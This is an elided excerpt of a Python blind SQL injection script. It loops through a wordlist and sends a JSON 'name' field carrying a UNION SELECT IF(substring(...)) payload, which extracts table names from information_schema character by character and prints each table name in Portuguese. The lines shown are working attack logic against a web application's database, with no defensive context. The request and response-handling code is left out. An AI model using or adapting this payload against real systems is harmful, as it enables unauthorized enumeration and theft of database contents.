...
while LOOP==True:
    ...
    for PAY1 in WORDLIST:
        ...
        payload1 = json.dumps({"selectedOptions": ["Python"],
            "name": f"'UNION SELECT IF((SELECT substring((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT {CONTADOR},1),1,{NUMBERLETTERS})='{PAYLOAD}{PAY1}'),(SELECT table_name FROM information_schema.tables),'a')'-- -"
        })
        ...
        if PAY1==WORDLIST[NUMBERLINES-1]:
            CONTADOR+=1
            print(f"O nome da tabela é:" + PAYLOAD)
            if PAYLOAD=='':
                LOOP=False
            else:
                PAYLOAD=''
